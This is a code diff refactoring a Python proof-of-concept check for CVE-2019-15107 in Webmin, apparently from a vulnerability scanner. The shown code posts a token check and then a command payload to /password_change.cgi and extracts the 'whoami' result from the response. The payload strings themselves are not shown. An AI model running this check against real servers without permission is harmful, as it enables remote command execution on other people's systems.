@@ -7,19 +7,13 @@ description: CVE-2019-15107 任意代码执行漏洞
 
 import re
 import sys
-import string
-import random
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2019_15107_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta = ''
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.headers = {
             'Accept-Encoding': "gzip, deflate",
             'Accept': "*/*",
@@ -40,9 +34,9 @@ class CVE_2019_15107_BaseVerify:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
             vuln_url = self.url + "/password_change.cgi"
-            check_req = requests.post(url = vuln_url, headers = self.headers, data = self.check_payload, allow_redirects = False, verify=False)
+            check_req = request.post(url = vuln_url, headers = self.headers, data = self.check_payload)
             if check_req.status_code ==200 and " " in check_req.text and self.capta in check_req.text:
-                cmd_req = requests.post(url = vuln_url, headers = self.headers, data = self.cmd_payload, allow_redirects = False, verify=False)
+                cmd_req = request.post(url = vuln_url, headers = self.headers, data = self.cmd_payload)
                 pattern = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
                 cmd_result = pattern.findall(cmd_req.text)[0]
                 print("存在CVE-2019-15107 任意代码执行漏洞,执行whoami命令结果是:", cmd_result)
